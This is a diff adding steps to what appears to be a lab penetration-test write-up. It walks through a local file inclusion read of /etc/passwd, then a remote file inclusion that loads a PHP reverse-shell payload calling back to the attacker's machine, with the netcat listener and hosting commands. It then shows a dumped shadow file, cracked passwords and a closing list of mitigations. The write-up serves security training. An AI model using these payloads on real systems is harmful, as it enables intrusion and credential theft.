@@ -188,5 +188,102 @@ Using OWASP ZAP, the `selectLang` POST parameter was modified to traverse the fi
 selectLang=/../etc/passwd
 ```
 **Result:**
-The contents of `/etc/passwd` were successfully discloseed, confirming Location File Inclusion.
+The contents of `/etc/passwd` were successfully disclosed, confirming Location File Inclusion.
+
 ![Output from LFI](screenshots/LFI_etc_pwd.png)
+This confirmed presence of valid system users and enabled further attack planning.
+
+## Remote File Inclusion (RFI) & Reverse Shell
+**Vulnerability:**
+The same `selectLang` parameter accepted remote **URLs**, allowing Remote File Inclusion.
+
+### Method
+A malicious PHP file was created on the attacker machine and hosted using a Python HTTP server.
+```php
+<?php
+system("bash -c 'bash -i >/dev/tcp/192.168.56.102/1234 0<&1 2>&1'");
+?>
+```
+**Hosting the Payload (Kali)**
+```
+python3 -m http.server 8000
+```
+**Listener (Kali)**
+```
+nc -lvnp 1234
+```
+**RFI Request Sent (via OWASP ZAP)**
+```
+selectLang=http://192.168.56.102:8000/RFI.php
+```
+**Result**
+The victim server fetched and executed the remote PHP file, from there a reverse shell connection was established and shell access was obtained as the `www-data` user.
+
+![Shell Access](screenshots/RFI_Acc.png)
+
+## Privilige Escalation to Root
+
+After looking inside the shell, I found an interesting file under `../html/1.2` which was named `databaseConn.php`.
+![Bobby_needs_to_clean](screenshots/Bobby_PAss.png)
+
+Where we have the credentials for Bobby.\
+After using SSH to log into Bobby as a user, to find out if he had any access to 'fun' files *cough* `etc/shadow` *cough*.\
+He had sudo privileges to see the contents of the `etc/shadow`, which I then copied down, and began to crack.
+**Output**
+```
+root:$6$UFCkQvbe$m1tMWI2YnFNAYk8DQGK3bGy9/zSkbhlVlmiyYU.g0gu0KzxZ7SOvmjQt/7Ua2hdz1/n.xzSggWNvKSFF5Wfjv.:18223:0:99999:7:::
+daemon:*:18113:0:99999:7:::
+bin:*:18113:0:99999:7:::
+sys:*:18113:0:99999:7:::
+sync:*:18113:0:99999:7:::
+games:*:18113:0:99999:7:::
+man:*:18113:0:99999:7:::
+lp:*:18113:0:99999:7:::
+mail:*:18113:0:99999:7:::
+news:*:18113:0:99999:7:::
+uucp:*:18113:0:99999:7:::
+proxy:*:18113:0:99999:7:::
+www-data:*:18113:0:99999:7:::
+backup:*:18113:0:99999:7:::
+list:*:18113:0:99999:7:::
+irc:*:18113:0:99999:7:::
+gnats:*:18113:0:99999:7:::
+nobody:*:18113:0:99999:7:::
+systemd-network:*:18113:0:99999:7:::
+systemd-resolve:*:18113:0:99999:7:::
+syslog:*:18113:0:99999:7:::
+messagebus:*:18113:0:99999:7:::
+_apt:*:18113:0:99999:7:::
+lxd:*:18113:0:99999:7:::
+uuidd:*:18113:0:99999:7:::
+dnsmasq:*:18113:0:99999:7:::
+landscape:*:18113:0:99999:7:::
+pollinate:*:18113:0:99999:7:::
+bobby:$6$gSfGcKdiS4apAy2z$4xj.ItKrp2kOFZ0RZydCThBkf5SVaGIn3Lk5jDhRGvpK/ZwQbPZZFbp.hG8zge/UHbX/jYFwLPZCyA3UEYg9N/:18218:0:99999:7:::
+mysql:!:18218:0:99999:7:::
+sshd:*:18223:0:99999:7:::
+```
+I took out the SHA512 hashes and created a new file with them, to begin cracking - both with John the Ripper and Hashcat.
+Hashcat yielded a result on Bobby (we already know his pass):
+```
+BOBBY BOY:$6$gSfGcKdiS4apAy2z$4xj.ItKrp2kOFZ0RZydCThBkf5SVaGIn3Lk5jDhRGvpK/ZwQbPZZFbp.hG8zge/UHbX/jYFwLPZCyA3UEYg9N/:strongpass
+```
+```
+root:$6$UFCkQvbe$m1tMWI2YnFNAYk8DQGK3bGy9/zSkbhlVlmiyYU.g0gu0KzxZ7SOvmjQt/7Ua2hdz1/n.xzSggWNvKSFF5Wfjv./:system-administration
+```
+
+### Attack Summary & Mitigations
+**Vulnerabilites Identified:**
+- SQL Injection
+- Local File Inclusion
+- Remote File Inclusion
+- Weak file permissions
+- Weak passwords
+- Misconfigured sudo privileges
+
+## Preventive Measures
+- Use parameterized SQL queries
+- Sanitize and whitelist file inclusion paths
+- Apply strict file permissions
+- Enforce strong password policies
+- Restrict sudo access.
